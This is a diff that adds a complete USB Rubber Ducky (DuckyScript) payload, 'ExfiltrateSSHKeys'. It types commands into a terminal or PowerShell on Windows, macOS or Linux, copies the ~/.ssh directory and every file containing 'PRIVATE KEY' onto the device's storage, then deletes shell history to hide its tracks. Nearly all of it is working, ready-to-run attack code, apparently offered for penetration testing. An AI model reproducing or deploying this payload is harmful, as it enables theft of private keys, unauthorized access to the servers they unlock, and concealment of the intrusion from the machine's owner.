@@ -1,0 +1,164 @@
+REM Title: ExfiltrateSSHKeys
+REM Author: thomasgruebl
+REM Target: Windows, macOS, Linux (partly functional)
+REM Version: 1.0
+REM Category: Exfiltration
+REM Description: This payload performs an SSH key exfiltration attack by (1) 
+REM              checking the default ssh key location ~/.ssh/ and (2) by performing a
+REM              grep recursive pattern matching search for an SSH private key in a specified parent directory.
+
+EXTENSION DETECT_READY
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+
+        TARGETS:
+            Any system that reflects CAPSLOCK will detect minimum required delay
+            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+ATTACKMODE HID STORAGE
+
+$_JITTER_ENABLED = TRUE
+
+REM Define OS - Only set ONE definition at the time to TRUE (e.g. DEFINE #WINDOWS TRUE).
+REM DEFINE #WINDOWS TRUE, DEFINE #MACOS TRUE, and DEFINE #LINUX TRUE won't function.
+DEFINE #WINDOWS TRUE
+DEFINE #MACOS FALSE
+DEFINE #LINUX FALSE
+
+REM Define Rubber Ducky Drive Label
+DEFINE #DUCKY_DRIVE_LABEL DUCKY
+
+REM Using "Desktop" as a sample directory
+DEFINE #PARENT_DIR Desktop
+
+IF_DEFINED_TRUE #MACOS
+    DELAY 500
+    GUI SPACE
+    DELAY 500
+    STRING terminal
+    DELAY 50
+    ENTER
+    DELAY 100
+    STRING cd
+    DELAY 50
+    ENTER
+    DELAY 100
+    
+    REM Create exfiltration directory + add some extra delay to give the rubber ducky time to mount storage
+    DELAY 2000
+    STRING mkdir /Volumes/#DUCKY_DRIVE_LABEL/ssh_exfiltration
+    DELAY 50
+    ENTER
+    DELAY 100
+    
+    REM Method 1: Copy ~/.ssh dir
+    STRING cp .ssh/* /Volumes/#DUCKY_DRIVE_LABEL/ssh_exfiltration
+    DELAY 50
+    ENTER
+    
+    DELAY 1000
+    
+    REM Method 2: Recursively search a parent directory for an ssh key pattern
+    STRING matches=$(grep -rl "PRIVATE KEY" #PARENT_DIR) && for file in ${(f)matches}; do cp "$file" /Volumes/#DUCKY_DRIVE_LABEL/ssh_exfiltration; done;
+    DELAY 50
+    ENTER
+    
+    DELAY 3000
+    
+    REM Cleaning up
+    
+    REM 1. Flush shell history
+    STRING history -p && rm -f .zsh_history && touch .zsh_history && kill -9 $$
+    DELAY 50
+    ENTER
+
+    REM 2. Quit terminal
+    DELAY 100
+    GUI q
+
+END_IF_DEFINED
+
+
+IF_DEFINED_TRUE #WINDOWS
+
+    REM Method 1: Copy ~/.ssh dir
+    GUI r
+    DELAY 500
+    STRING powershell "$vol=(Get-Volume -FileSystemLabel '#DUCKY_DRIVE_LABEL').DriveLetter;
+    STRING mkdir $vol':\'ssh_exfiltration\;
+    STRING cp -r $env:USERPROFILE\.ssh\* $vol':\'ssh_exfiltration\; Start-Sleep -Seconds 0.5"
+    DELAY 100
+    ENTER
+    DELAY 1000
+
+    REM Method 2: Recursively search a parent directory for an ssh key pattern
+    GUI r
+    DELAY 100
+    STRING powershell "$vol=(Get-Volume -FileSystemLabel '#DUCKY_DRIVE_LABEL').DriveLetter;
+    STRING $matches=(findstr /MSPI 'PRIVATE KEY' $env:USERPROFILE\#PARENT_DIR\*);
+    STRING $split_matches=$matches -split '`n';
+    STRING foreach ($line in $split_matches) { cp $line $vol':\'ssh_exfiltration\ }"
+    DELAY 100
+    ENTER
+    
+    DELAY 500
+END_IF_DEFINED
+
+
+IF_DEFINED_TRUE #LINUX
+
+    REM Needed longer delays on Ubuntu system while testing
+    DELAY 3000
+    CTRL-ALT t
+    DELAY 3000
+
+    STRINGLN cd
+    DELAY 100
+
+    REM identify user
+    STRINGLN USER_NAME=$(whoami)
+    DELAY 500
+    
+    STRINGLN mkdir /media/$USER_NAME/#DUCKY_DRIVE_LABEL/ssh_exfiltration
+    DELAY 100
+    
+    REM Method 1: Copy ~/.ssh dir
+    STRINGLN cp .ssh/* /media/$USER_NAME/#DUCKY_DRIVE_LABEL/ssh_exfiltration
+    
+    DELAY 1000
+    
+    REM Method 2: Recursively search a parent directory for an ssh key pattern
+    STRINGLN matches=$(grep -rl "PRIVATE KEY" #PARENT_DIR) && for file in ${(f)matches}; do cp "$file" /media/$USER_NAME/#DUCKY_DRIVE_LABEL/ssh_exfiltration; done;
+    
+    DELAY 3000
+    
+    REM Cleaning up
+
+    REM 1. Flush shell history
+    STRINGLN history -p && rm -f .bash_history && touch .bash_history && kill -9 $$
+    DELAY 100
+
+    REM 2. Quit terminal
+    STRINGLN exit
+
+END_IF_DEFINED
